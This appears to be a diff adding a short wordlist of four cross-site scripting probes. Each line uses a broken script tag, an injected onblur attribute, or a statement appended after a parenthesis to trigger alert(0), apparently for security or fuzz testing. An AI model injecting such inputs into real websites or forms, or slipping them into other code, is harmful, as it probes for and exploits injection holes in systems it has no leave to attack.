@@ -1,0 +1,4 @@
+script>alert(0);</script
+“ onblur=javascript:alert(0) “ or “>
+123); alert(0);
+onblur=javascript:alert(0)
